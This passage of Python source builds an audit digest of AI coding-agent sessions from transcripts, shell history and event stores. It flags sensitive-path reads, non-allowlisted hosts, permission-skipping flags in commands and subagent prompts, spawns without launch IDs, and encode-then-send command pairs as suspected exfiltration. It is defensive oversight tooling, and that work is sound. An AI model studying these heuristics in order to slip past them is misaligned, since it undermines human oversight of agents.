            "tags": tags,
        }
        self.shell_commands.append(entry)
        self._sort_key(entry, ts_dt)

        for target in _shell_write_targets(raw):
            self.file_writes.append(
                {
                    "seq": self._next(),
                    "session_id": session_id,
                    "timestamp": ts,
                    "path": _safe(target),
                    "tool": "shell-redirect",
                    "inside_allowed_roots": _inside_roots(target, self.opts.allowed_write_roots),
                    "_sort": (ts_dt, session_id, seq),
                }
            )
        for token in _TOKEN_RE.findall(raw):
            pattern = matches_sensitive(token, self.opts.sensitive_paths)
            if pattern:
                self.sensitive_reads.append(
                    {
                        "seq": self._next(),
                        "session_id": session_id,
                        "timestamp": ts,
                        "path": _safe(token),
                        "matched": pattern,
                        "tool": "Bash",
                        "_sort": (ts_dt, session_id, seq),
                    }
                )
        for host in extract_hosts(raw):
            self.network.append(
                {
                    "seq": self._next(),
                    "session_id": session_id,
                    "timestamp": ts,
                    # a host IS a credential shape sometimes (a tunnel id, a
                    # preview slug), so the stored host goes through the mask
                    # even though the comparison against allowed_hosts used the
                    # real one.
                    "host": _safe(host),
                    "allowed": _host_allowed(host, self.opts.allowed_hosts),
                    "command": text,
                    "tool": "Bash",
                    "_sort": (ts_dt, session_id, seq),
                }
            )
        flag = _PERMISSION_FLAG_RE.search(raw) or _PERMISSION_FILE_RE.search(raw)
        if flag:
            self.permission_flags.append(
                {
                    "seq": self._next(),
                    "session_id": session_id,
                    "timestamp": ts,
                    "kind": "command",
                    "match": _safe(flag.group(0)),
                    "detail": text,
                    "_sort": (ts_dt, session_id, seq),
                }
            )

    def _sort_key(self, entry: dict[str, Any], ts_dt: datetime | None) -> None:
        entry["_sort"] = (ts_dt, entry.get("session_id") or "", entry["seq"])


def _host_allowed(host: str, allowed: list[str]) -> bool | None:
    if not allowed:
        return None
    host = host.lower()
    for a in allowed:
        if host == a or host.endswith("." + a):
            return True
    return False


def _read_transcripts(opts: AuditOptions, collector: _Collector) -> dict[str, Any]:
    root = opts.transcripts
    if root is None or not root.is_dir():
        return {
            "present": False,
            "detail": f"transcripts directory not found: {root}",
            "files": 0,
            "rows": 0,
            "unparsed_rows": 0,
            "undated_rows": 0,
        }
    files = sorted(root.rglob("*.jsonl"), key=lambda p: p.relative_to(root).as_posix())
    rows = unparsed = undated = unreadable = 0
    for path in files:
        rel = path.relative_to(root).as_posix()
        kind = "subagent" if "subagents" in path.parts else "main"
        try:
            data = path.read_bytes()
        except OSError:
            unreadable += 1
            continue
        try:
            body = data.decode("utf-8")
        except UnicodeDecodeError:
            # A binary or truncated-mid-codepoint file is UNREADABLE, and says
            # so under the counter named for it. Parsing continues tolerantly
            # (whatever real rows it holds still count) -- what changed is that
            # the file no longer disappears into ``unparsed_rows`` alone.
            unreadable += 1
            body = data.decode("utf-8", errors="replace")
        lines = body.splitlines()

        # A session is registered on its first row INSIDE the window, never on
        # the mere existence of a file. ~/.claude/projects is append-only in
        # practice -- one file per session, forever -- so registering per file
        # put every historical session into `sessions[]` and into
        # `volume.total.sessions` with start:null/end:null/tool_calls:0, and
        # then let the 200-cap drop TODAY's session because the cap was applied
        # in relative-path order. The counts the skill's "Counts" line asks for
        # were counts of the directory, not of the day.
        session: dict[str, Any] | None = None
        blank_session = {
            "id": path.stem,
            "slug": rel[: -len(".jsonl")] if rel.endswith(".jsonl") else rel,
            "kind": kind,
            "start": None,
            "end": None,
            "tool_calls": 0,
            "model": None,
            "cwd": None,
            "git_branch": None,
            "_sort": rel,
        }

        for line in lines:
            line = line.strip()
            if not line:
                continue
            rows += 1
            try:
                row = json.loads(line)
            except (ValueError, TypeError):
                unparsed += 1
                continue
            if not isinstance(row, dict):
                unparsed += 1
                continue
            ts_raw = row.get("timestamp")
            ts_dt = _parse_ts(ts_raw)
            if ts_dt is None:
                undated += 1
                continue
            if not (opts.since_dt <= ts_dt <= opts.until_dt):
                continue
            if session is None:
                session = collector.sessions.setdefault(rel, blank_session)
            if isinstance(row.get("sessionId"), str) and row["sessionId"]:
                session["id"] = row["sessionId"]
            if row.get("isSidechain") is True or row.get("agentId"):
                session["kind"] = "subagent"
            model = _row_model(row)
            if model:
                session["model"] = model
            if isinstance(row.get("cwd"), str):
                session["cwd"] = _safe(row["cwd"])
            if isinstance(row.get("gitBranch"), str):
                session["git_branch"] = _safe(row["gitBranch"])
            ts = str(ts_raw)
            if session["start"] is None or ts < session["start"]:
                session["start"] = ts
            if session["end"] is None or ts > session["end"]:
                session["end"] = ts
            _collect_tool_uses(row, session, collector, ts=ts, ts_dt=ts_dt)
    # "Silence is not a clean bill" (skill rule 3): a transcripts directory that exists
    # but holds nothing is a MISSING source, not a quiet day. Reporting present=True
    # here would let the rubric reach QUIET on the day transcripts stopped being
    # written -- the one day it must not.
    present = bool(files)
    if not files:
        detail = f"transcripts directory {root} exists but holds no *.jsonl files"
    else:
        detail = (
            f"{len(files)} transcript file(s) under {root}; "
            f"{len(collector.sessions)} session(s) with at least one row inside the window"
        )
    return {
        "present": present,
        "detail": detail,
        "files": len(files),
        "rows": rows,
        "unparsed_rows": unparsed,
        "undated_rows": undated,
        "unreadable_files": unreadable,
    }


def _collect_tool_uses(
    row: dict[str, Any], session: dict[str, Any], collector: _Collector, *, ts: str, ts_dt: datetime
) -> None:
    opts = collector.opts
    session_id = str(session["id"])
    agent_id = row.get("agentId") if isinstance(row.get("agentId"), str) else None
    cwd = row.get("cwd") if isinstance(row.get("cwd"), str) else None
    for block in _iter_tool_uses(row):
        name = block.get("name")
        if not isinstance(name, str) or not name:
            name = "(unnamed)"
        tool_input = block.get("input")
        if not isinstance(tool_input, dict):
            tool_input = {}
        session["tool_calls"] += 1
        collector.tools[name] = collector.tools.get(name, 0) + 1
        lower = name.lower()
        seq = collector._next()
        base_sort = (ts_dt, session_id, seq)
        #: one permission_flags row per tool_use at most, whichever branch
        #: below found it -- the spawn-prompt scan or the generic one.
        permission_recorded = False

        if lower in _BASH_TOOLS:
            command = tool_input.get("command")
            if isinstance(command, str) and command.strip():
                collector.add_command(
                    command=command, session_id=session_id, ts=ts, ts_dt=ts_dt, cwd=cwd, source="transcript"
                )
        elif lower in _WRITE_TOOLS:
            target = tool_input.get("file_path") or tool_input.get("notebook_path") or tool_input.get("path")
            if isinstance(target, str) and target:
                collector.file_writes.append(
                    {
                        "seq": seq,
                        "session_id": session_id,
                        "timestamp": ts,
                        "path": _safe(target),
                        "tool": name,
                        "inside_allowed_roots": _inside_roots(target, opts.allowed_write_roots),
                        "_sort": base_sort,
                    }
                )
        elif lower in _READ_TOOLS:
            target = (
                tool_input.get("file_path")
                or tool_input.get("notebook_path")
                or tool_input.get("path")
                or tool_input.get("pattern")
            )
            if isinstance(target, str) and target:
                pattern = matches_sensitive(target, opts.sensitive_paths)
                if pattern:
                    collector.sensitive_reads.append(
                        {
                            "seq": seq,
                            "session_id": session_id,
                            "timestamp": ts,
                            "path": _safe(target),
                            "matched": pattern,
                            "tool": name,
                            "_sort": base_sort,
                        }
                    )
        elif lower in _SPAWN_TOOLS:
            prompt = tool_input.get("prompt")
            launch = _LAUNCH_ID_RE.search(prompt) if isinstance(prompt, str) else None
            # ``prompt`` is a _CONTENT_KEYS key, so the generic scanner below
            # never looks at it -- and the rubric's permission clause opens
            # with "a subagent spawned with permissions skipped", which is a
            # flag that lives in exactly that string and nowhere else. The
            # narrow regex runs over it (the same string the launch-id regex
            # already reads) and only the bounded _match_context window is
            # stored; the prompt itself still never enters the digest.
            if isinstance(prompt, str) and prompt:
                pflag = _PERMISSION_FLAG_RE.search(prompt)
                if pflag:
                    permission_recorded = True
                    collector.permission_flags.append(
                        {
                            "seq": collector._next(),
                            "session_id": session_id,
                            "timestamp": ts,
                            "kind": f"tool:{name}",
                            "match": _safe(pflag.group(0)),
                            "detail": _safe(_match_context(prompt, pflag)),
                            "_sort": base_sort,
                        }
                    )
            collector.spawn_entries.append(
                {
                    "seq": seq,
                    "session_id": session_id,
                    "timestamp": ts,
                    "tool": name,
                    "subagent_type": _safe(tool_input.get("subagent_type") or tool_input.get("agent") or ""),
                    "description": _safe(tool_input.get("description") or ""),
                    "launch_id": launch.group(0) if launch else None,
                    "agent_id": _safe(agent_id) if agent_id else None,
                    "_sort": base_sort,
                }
            )

        strings: list[str] = []
        _scan_strings(tool_input, strings)
        for text in strings:
            if permission_recorded:
                break
            flag = _PERMISSION_FLAG_RE.search(text)
            if flag is None and lower in _WRITE_TOOLS:
                flag = _PERMISSION_FILE_RE.search(text)
            if flag:
                collector.permission_flags.append(
                    {
                        "seq": collector._next(),
                        "session_id": session_id,
                        "timestamp": ts,
                        "kind": f"tool:{name}",
                        "match": _safe(flag.group(0)),
                        "detail": _safe(_match_context(text, flag)),
                        "_sort": base_sort,
                    }
                )
                break
        if lower not in _BASH_TOOLS:
            seen_urls: set[str] = set()
            for text in strings:
                for url in _URL_RE.findall(text):
                    if url in seen_urls:
                        continue
                    seen_urls.add(url)
                    for host in extract_hosts(url):
                        collector.network.append(
                            {
                                "seq": collector._next(),
                                "session_id": session_id,
                                "timestamp": ts,
                                "host": _safe(host),
                                "allowed": _host_allowed(host, opts.allowed_hosts),
                                "command": _safe(url),
                                "tool": name,
                                "_sort": base_sort,
                            }
                        )


# ---------------------------------------------------------------------------
# shell history
# ---------------------------------------------------------------------------

#: zsh's ``EXTENDED_HISTORY`` (and any shell that copies it): the timestamp is
#: part of the command's own line.
_HISTORY_TS_RE = re.compile(r"^:\s*(\d{9,}):(\d+);(.*)$")
#: bash with ``HISTTIMEFORMAT`` set: the timestamp is written as a COMMENT LINE
#: before the command, never on the command's line. Parsed too, because a
#: deployment that sets HISTTIMEFORMAT to get a windowable history would
#: otherwise find every `#<epoch>` line stored as if it were a command.
_HISTORY_BASH_TS_RE = re.compile(r"^#\s*(\d{9,})\s*$")


def _read_history(opts: AuditOptions, collector: _Collector) -> dict[str, Any]:
    path = opts.history
    absent = {"lines": 0, "dated": 0, "undated_included": 0, "undated_skipped": 0, "windowed": False}
    if path is None:
        return {"present": False, "detail": "no --history given", **absent}
    if not path.is_file():
        return {"present": False, "detail": f"history file not found: {path}", **absent}
    try:
        raw = path.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        return {"present": False, "detail": f"history file unreadable: {exc}", **absent}
    lines = raw.splitlines()
    dated: list[tuple[datetime, str]] = []
    undated: list[str] = []
    pending: list[str] = []
    pending_ts: datetime | None = None
    total = 0

    def _flush() -> None:
        nonlocal pending, pending_ts
        if not pending:
            return
        command = "\n".join(pending).strip()
        if command:
            if pending_ts is not None:
                dated.append((pending_ts, command))
            else:
                undated.append(command)
        pending = []
        pending_ts = None

    bash_ts: datetime | None = None
    for line in lines:
        if not line.strip():
            continue
        stamp = _HISTORY_BASH_TS_RE.match(line)
        if stamp:
            # bash writes the timestamp on its OWN line, before the command; it
            # is not a line of history and is not counted as one.
            _flush()
            bash_ts = _parse_ts(int(stamp.group(1)))
            continue
        total += 1
        m = _HISTORY_TS_RE.match(line)
        if m:
            _flush()
            pending_ts = _parse_ts(int(m.group(1)))
            pending = [m.group(3)]
            # a line that carries its own timestamp consumes any dangling
            # bash stamp, so a mixed-format file cannot date the NEXT command
            # with a stamp that belonged to this one.
            bash_ts = None
        elif pending and pending[-1].endswith("\\"):
            pending.append(line)
        else:
            _flush()
            pending = [line]
            if bash_ts is not None:
                pending_ts = bash_ts
                bash_ts = None
        if pending and not pending[-1].endswith("\\"):
            _flush()
    _flush()

    in_window = [(dt, cmd) for dt, cmd in dated if opts.since_dt <= dt <= opts.until_dt]
    for dt, command in in_window:
        collector.add_command(
            command=command, session_id="(history)", ts=_iso(dt), ts_dt=dt, cwd=None, source="history"
        )
    tail = undated[-HISTORY_UNDATED_TAIL:]
    for command in tail:
        collector.add_command(
            command=command, session_id="(history)", ts=None, ts_dt=None, cwd=None, source="history-undated"
        )
    # Same rule as the transcripts above, and the skill names this one explicitly among
    # its missing sources: "an empty history". A history file that exists and holds
    # nothing is a source that failed, not a source that was quiet.
    detail = (
        f"{total} line(s) in {path}; {len(in_window)} dated line(s) inside the window, "
        f"{len(tail)} undated line(s) included (the most recent), "
        f"{max(0, len(undated) - len(tail))} older undated line(s) not included"
    )
    if undated:
        # A structured flag, not only prose: the rubric's section-2 pass reads
        # keys. An undated history is a source the --since window never touched
        # and whose oldest lines are dropped outright -- 80% unwindowed and 20%
        # discarded is not a source in good standing, and "present: true" alone
        # would say it was. Set HISTTIMEFORMAT (bash) or EXTENDED_HISTORY (zsh)
        # on the machine writing it.
        detail += (
            "; this history is NOT fully windowed -- the shell writing it does not "
            "record timestamps (bash: HISTTIMEFORMAT, zsh: setopt EXTENDED_HISTORY)"
        )
    if total == 0:
        detail = f"history file {path} exists but is empty"
    return {
        "present": total > 0,
        "windowed": total > 0 and not undated,
        "detail": detail,
        "lines": total,
        "dated": len(dated),
        "dated_in_window": len(in_window),
        "undated_included": len(tail),
        "undated_skipped": max(0, len(undated) - len(tail)),
    }


# ---------------------------------------------------------------------------
# events + doctor
# ---------------------------------------------------------------------------


def _payload_summary(payload: Any) -> str:
    """A few ``key=value`` pairs from an event payload, each value clipped --
    an event payload is small by convention, but the digest must not become a
    dumping ground for one that is not."""
    if not isinstance(payload, str):
        return ""
    try:
        obj = json.loads(payload)
    except (ValueError, TypeError):
        return ""
    if not isinstance(obj, dict):
        return ""
    parts = []
    for key in sorted(obj)[:4]:
        value = repr(obj[key])
        parts.append(f"{key}={value[:80]}")
    return ", ".join(parts)


def _read_events(opts: AuditOptions) -> tuple[list[dict[str, Any]], int, dict[str, Any]]:
    """Event rows in the window, through a READ-ONLY connection. Returns
    ``(rows, bookings_booked, coverage)``."""
    if opts.program_root is None:
        return [], 0, {"present": False, "detail": "no --program-root given"}
    from trialerror.stores import paths

    ops_path = paths.ops_db_path(opts.program_root)
    if not Path(ops_path).is_file():
        return [], 0, {"present": False, "detail": f"ops store not found: {ops_path}"}
    from trialerror.stores.connection import connect

    rows: list[dict[str, Any]] = []
    try:
        conn = connect(ops_path, read_only=True)
    except Exception as exc:  # noqa: BLE001 - a missing source is a coverage row
        return [], 0, {"present": False, "detail": f"ops store unreadable: {type(exc).__name__}: {exc}"}
    try:
        placeholders = ",".join("?" for _ in PROGRAM_EVENT_TYPES)
        # The window is applied in PYTHON, not in SQL: stored timestamps carry
        # millisecond precision and the window bounds are whole seconds, so a
        # lexical `ts >= ?` would drop a row at `...:00.500Z` from a window that
        # opens at `...:00Z` ('.' sorts before 'Z'). The type filter is what
        # keeps the scan small.
        cur = conn.execute(
            f"SELECT event_id, ts, session_id, launch_id, workpackage, type, payload FROM event "
            f"WHERE type IN ({placeholders}) ORDER BY ts ASC, rowid ASC",
            tuple(PROGRAM_EVENT_TYPES),
        )
        for r in cur.fetchall():
            row = dict(r)
            ts_dt = _parse_ts(row.get("ts"))
            if ts_dt is None or not (opts.since_dt <= ts_dt <= opts.until_dt):
                continue
            rows.append(
                {
                    "event_id": row.get("event_id"),
                    "ts": row.get("ts"),
                    "type": row.get("type"),
                    "session_id": row.get("session_id"),
                    "launch_id": row.get("launch_id"),
                    "summary": _safe(_payload_summary(row.get("payload"))),
                }
            )
    except Exception as exc:  # noqa: BLE001
        conn.close()
        return [], 0, {"present": False, "detail": f"event query failed: {type(exc).__name__}: {exc}"}
    conn.close()

    bookings = 0
    booking_detail = ""
    platform_path = paths.platform_db_path(root=opts.platform_root)
    if Path(platform_path).is_file():
        try:
            pconn = connect(platform_path, read_only=True)
            try:
                for r in pconn.execute("SELECT booked_ts FROM launch").fetchall():
                    dt = _parse_ts(dict(r).get("booked_ts"))
                    if dt is not None and opts.since_dt <= dt <= opts.until_dt:
                        bookings += 1
            finally:
                pconn.close()
        except Exception as exc:  # noqa: BLE001
            booking_detail = f"; launch bookings not counted ({type(exc).__name__})"
    else:
        booking_detail = f"; no platform store at {platform_path}, launch bookings not counted"
    return (
        rows,
        bookings,
        {
            "present": True,
            "detail": (
                f"{len(rows)} event row(s) of {len(PROGRAM_EVENT_TYPES)} tracked type(s) in the window"
                f"{booking_detail}. Spawn-gate refusals are counted from "
                f"{GATE_REFUSAL_EVENT_TYPES[0]!r} rows; the current spawn-gate hook signals a refusal "
                "by exit code and writes no such row, so a zero here is not proof no spawn was refused."
            ),
        },
    )


_EMPTY_DOCTOR: dict[str, Any] = {
    "fail": [],
    "warn": [],
    "counts": {"fail": 0, "warn": 0, "pass": 0, "skip": 0},
    "checks_run": 0,
}


def _run_doctor(opts: AuditOptions) -> tuple[dict[str, Any], dict[str, Any]]:
    if opts.program_root is None:
        return (
            dict(_EMPTY_DOCTOR),
            {"present": False, "detail": "no --program-root given; doctor not run"},
        )
    if not opts.program_root.is_dir():
        # A doctor pointed at a root that is not there reports fail: 0 -- and
        # section 2 of the rubric tells the reader to check that field first.
        # A misconfigured root is a MISSING source, not a clean bill: every
        # program-scoped check would skip, and a run of skips is not a run.
        return (
            dict(_EMPTY_DOCTOR),
            {"present": False, "detail": f"program root not found: {opts.program_root}; doctor not run"},
        )
    try:
        from trialerror.util.doctor import DoctorContext, discover_and_register_checks, run_checks

        discover_and_register_checks()
        results = run_checks(
            DoctorContext(program_root=opts.program_root, platform_root=opts.platform_root)
        )
    except Exception as exc:  # noqa: BLE001 - a doctor that cannot run is a coverage row
        return (
            dict(_EMPTY_DOCTOR),
            {"present": False, "detail": f"doctor could not run: {type(exc).__name__}: {exc}"},
        )
    counts = {"fail": 0, "warn": 0, "pass": 0, "skip": 0}
    fails: list[dict[str, Any]] = []
    warns: list[dict[str, Any]] = []
    for r in results:
        counts[r.status] = counts.get(r.status, 0) + 1
        if r.status in ("fail", "warn"):
            row = {"name": r.name, "category": r.category, "status": r.status, "message": _safe(r.message)}
            (fails if r.status == "fail" else warns).append(row)
    fails.sort(key=lambda d: d["name"])
    warns.sort(key=lambda d: d["name"])
    return (
        {
            "fail": fails[: CAPS["doctor_rows"]],
            "warn": warns[: CAPS["doctor_rows"]],
            "counts": counts,
            "checks_run": len(results),
        },
        {
            "present": True,
            # the SKIP count belongs in the sentence: "65 checks, 0 fail" reads
            # as a clean bill when 59 of the 65 never looked at anything.
            "detail": (
                f"{len(results)} check(s) run at digest time: {counts['fail']} fail, "
                f"{counts['warn']} warn, {counts['pass']} pass, {counts['skip']} skip"
            ),
        },
    )


# ---------------------------------------------------------------------------
# previous digests
# ---------------------------------------------------------------------------


def _read_previous(opts: AuditOptions) -> dict[str, Any]:
    out: dict[str, Any] = {
        "digests": 0,
        "median_tool_calls": None,
        "median_shell_commands": None,
        "samples": [],
        "detail": "no --previous-dir given",
    }
    if opts.previous_dir is None:
        return out
    if not opts.previous_dir.is_dir():
        out["detail"] = f"previous-digest directory not found: {opts.previous_dir}"
        return out
    files = sorted(opts.previous_dir.glob("*.json"), key=lambda p: p.name)[-7:]
    tool_calls: list[int] = []
    shell: list[int] = []
    samples: list[dict[str, Any]] = []
    unreadable = 0
    for path in files:
        try:
            obj = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, ValueError, TypeError):
            unreadable += 1
            continue
        if not isinstance(obj, dict):
            unreadable += 1
            continue
        total = ((obj.get("volume") or {}).get("total") or {}) if isinstance(obj.get("volume"), dict) else {}
        tc = total.get("tool_calls")
        sc = total.get("shell_commands")
        sample = {"file": path.name, "tool_calls": tc if isinstance(tc, int) else None,
                  "shell_commands": sc if isinstance(sc, int) else None}
        samples.append(sample)
        if isinstance(tc, int):
            tool_calls.append(tc)
        if isinstance(sc, int):
            shell.append(sc)
    out["digests"] = len(samples)
    out["samples"] = samples
    out["median_tool_calls"] = float(statistics.median(tool_calls)) if tool_calls else None
    out["median_shell_commands"] = float(statistics.median(shell)) if shell else None
    out["detail"] = (
        f"{len(samples)} previous digest(s) read from {opts.previous_dir} (newest 7 by filename)"
        + (f"; {unreadable} unreadable" if unreadable else "")
    )
    return out


# ---------------------------------------------------------------------------
# assembly
# ---------------------------------------------------------------------------


def _sort_entries(entries: list[dict[str, Any]]) -> list[dict[str, Any]]:
    def key(e: dict[str, Any]):
        ts, sid, seq = e.get("_sort", (None, "", 0))
        return (0 if ts is None else 1, ts.isoformat() if ts else "", sid, seq)

    return sorted(entries, key=key)


def _sort_and_cap(entries: list[dict[str, Any]], cap: int, *, tagged_first: bool = False) -> tuple[list[dict[str, Any]], int]:
    ordered = _sort_entries(entries)
    if tagged_first and len(ordered) > cap:
        ordered = [e for e in ordered if e.get("tags")] + [e for e in ordered if not e.get("tags")]
    dropped = max(0, len(ordered) - cap)
    kept = ordered[:cap]
    for e in kept:
        e.pop("_sort", None)
        e.pop("seq", None)
    return kept, dropped


def _mark_exfil_pairs(commands: list[dict[str, Any]]) -> None:
    """The encode-then-send half of the exfil rule: an ``encode`` command whose
    immediate successor in the SAME session is a ``network`` command marks both.
    Runs over the already-sorted list so it is order-deterministic."""
    last_encode: dict[str, dict[str, Any]] = {}
    for entry in commands:
        sid = entry.get("session_id") or ""
        tags = set(entry.get("tags") or [])
        if "network" in tags and sid in last_encode:
            prev = last_encode[sid]
            prev_tags = set(prev.get("tags") or [])
            prev_tags.add("exfil_suspect")
            prev["tags"] = sorted(prev_tags)
            tags.add("exfil_suspect")
            entry["tags"] = sorted(tags)
        if "encode" in tags:
            last_encode[sid] = entry
        else:
            last_encode.pop(sid, None)


def canonical_json(obj: Any) -> str:
    """The one serialization the hash is taken over: sorted keys, compact
    separators, non-ASCII preserved."""
    return json.dumps(obj, sort_keys=True, ensure_ascii=False, separators=(",", ":"))


def compute_digest_sha256(digest: dict[str, Any]) -> str:
    body = {k: v for k, v in digest.items() if k != "digest_sha256"}
    return hashlib.sha256(canonical_json(body).encode("utf-8")).hexdigest()


def build_digest(opts: AuditOptions) -> dict[str, Any]:
    """The digest, exactly the shape the skill's section-1 table names -- every
    key present even when empty, nothing above it added."""
    collector = _Collector(opts)
    transcripts_cov = _read_transcripts(opts, collector)
    history_cov = _read_history(opts, collector)
    events, bookings, events_cov = _read_events(opts)
    doctor, doctor_cov = _run_doctor(opts)
    previous = _read_previous(opts)

    total_tool_calls = sum(collector.tools.values())
    total_shell = len(collector.shell_commands)

    sessions = sorted(collector.sessions.values(), key=lambda s: s["_sort"])
    per_session_shell: dict[str, int] = {}
    for c in collector.shell_commands:
        sid = c.get("session_id") or ""
        per_session_shell[sid] = per_session_shell.get(sid, 0) + 1
    dropped_sessions = max(0, len(sessions) - CAPS["sessions"])
    if dropped_sessions:
        # Cap by RECENCY, then restore the stable slug order for the reader.
        # Capping in slug order dropped whichever sessions sort last -- and a
        # session slug is a project path plus a uuid, so "last" is arbitrary:
        # today's session could be cut while two hundred older ones were kept.
        by_recency = sorted(
            sessions,
            key=lambda s: (str(s.get("end") or ""), str(s.get("start") or ""), s["_sort"]),
            reverse=True,
        )
        keep = {s["_sort"] for s in by_recency[: CAPS["sessions"]]}
        sessions = [s for s in sessions if s["_sort"] in keep]
    for s in sessions:
        s.pop("_sort", None)

    # the encode-then-send pass runs over the FULL sorted list, before any cap:
    # a pair split by the cap would otherwise go unmarked.
    _mark_exfil_pairs(_sort_entries(collector.shell_commands))
    shell_commands, dropped_shell = _sort_and_cap(collector.shell_commands, CAPS["shell_commands"], tagged_first=True)
    file_writes, dropped_writes = _sort_and_cap(collector.file_writes, CAPS["file_writes"])
    sensitive_reads, dropped_reads = _sort_and_cap(collector.sensitive_reads, CAPS["sensitive_reads"])
    network, dropped_network = _sort_and_cap(collector.network, CAPS["network"])
    permission_flags, dropped_perm = _sort_and_cap(collector.permission_flags, CAPS["permission_flags"])
    spawn_entries, dropped_spawns = _sort_and_cap(collector.spawn_entries, CAPS["spawn_entries"])

    spawns_seen = len(collector.spawn_entries)
    spawns_without_launch = sum(1 for e in collector.spawn_entries if not e.get("launch_id"))
    returns = [e for e in events if e["type"] == "subagent_return"]
    program_events = events[: CAPS["program_events"]]

    digest: dict[str, Any] = {
        "window": {
            "since": _iso(opts.since_dt),
            "until": _iso(opts.until_dt),
            "since_argument": opts.since_arg,
        },
        "coverage": {
            "transcripts": transcripts_cov,
            "history": history_cov,
            "events": events_cov,
            "doctor": doctor_cov,
            "containment": {
                "present": False,
                "detail": "host-side only: the host wrapper appends this array to the digest it captures",
            },
        },
        "config": {
            "allowed_write_roots": opts.allowed_write_roots,
            "sensitive_paths": opts.sensitive_paths,
            "allowed_hosts": opts.allowed_hosts,
            "transcripts_dir": str(opts.transcripts) if opts.transcripts else None,
            "history_file": str(opts.history) if opts.history else None,
            "program_root": str(opts.program_root) if opts.program_root else None,
        },
        "sessions": sessions,
        "tools": dict(sorted(collector.tools.items())),
        "shell_commands": shell_commands,
        "file_writes": file_writes,
        "sensitive_reads": sensitive_reads,
        "network": network,
        "permission_flags": permission_flags,
        "spawns": {
            "seen_in_transcripts": spawns_seen,
            "without_launch_id": spawns_without_launch,
            "with_launch_id": spawns_seen - spawns_without_launch,
            "bookings_booked": bookings,
            "returns": len(returns),
            "returns_without_launch_id": sum(1 for e in returns if not e.get("launch_id")),
            "gate_refusals": sum(1 for e in events if e["type"] in GATE_REFUSAL_EVENT_TYPES),
            "entries": spawn_entries,
            "program_events": program_events,
        },
        "doctor": doctor,
        "containment": [],
        "volume": {
            "total": {
                "tool_calls": total_tool_calls,
                "shell_commands": total_shell,
                "file_writes": len(collector.file_writes),
                "sessions": len(collector.sessions),
            },
            "per_session": [
                {
                    "session_id": str(s["id"]),
                    "slug": s["slug"],
                    "kind": s["kind"],
                    "tool_calls": s["tool_calls"],
                    "shell_commands": per_session_shell.get(str(s["id"]), 0),
                }
                for s in sessions
            ],
            "previous": previous,
            "caps": dict(sorted(CAPS.items())),
            "truncated": {
                "sessions": dropped_sessions,
                "shell_commands": dropped_shell,
                "file_writes": dropped_writes,
                "sensitive_reads": dropped_reads,
                "network": dropped_network,
                "permission_flags": dropped_perm,
                "spawn_entries": dropped_spawns,
                "program_events": max(0, len(events) - len(program_events)),
            },
        },
        "digest_sha256": "",
    }
    digest["digest_sha256"] = compute_digest_sha256(digest)
    return digest


def write_digest(digest: dict[str, Any], out_path: Path) -> Path:
    """Write the digest as pretty JSON, mode 600 where the platform honours it
    (a digest names paths and commands; it is not world-readable material)."""
    from trialerror.util.atomic import atomic_write_text

    out_path = Path(out_path)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    atomic_write_text(out_path, json.dumps(digest, ensure_ascii=False, indent=2, sort_keys=True) + "\n")
    try:
        out_path.chmod(0o600)
    except OSError:
        pass
    return out_path
